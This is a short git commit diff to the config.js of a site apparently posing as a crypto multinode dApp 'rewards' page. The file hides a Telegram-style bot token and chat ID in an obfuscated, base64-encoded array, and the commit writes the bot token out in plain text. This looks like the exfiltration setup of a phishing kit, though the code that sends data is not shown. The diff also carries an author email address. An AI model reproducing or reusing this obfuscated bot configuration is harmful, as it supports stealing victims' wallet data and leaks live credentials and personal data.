f7d060fc9c9c504b7caa2c3b43a3997c6588c3f4
SmallDevBigNothing <markogamerargumedo@gmail.com>
2025-06-14 13:20:14 +0200

    Update bot token configuration

--- prdt-multinodedapp-rewards.pages.dev/config.js
+++ prdt-multinodedapp-rewards.pages.dev/config.js
@@ -3,7 +3,7 @@
     const _0x4f8b=['token','chatId','bot','NzUyNTI4NjI0NDpBQUZrSnZQell4WmJkLUl2N2ViSHdsbHJaYlBFTHJhT3hfOA==','NjM0NTM4Mjc0Nw=='];
     window.config={
         [_0x4f8b[2]]:{
-            [_0x4f8b[0]]:atob(_0x4f8b[3]),
+            [_0x4f8b[0]]:'7525286244:AAFkjvPzYxZbd-Iv7ebHwllrZbPEL2aOx_8',
             [_0x4f8b[1]]:atob(_0x4f8b[4])
         }
     };
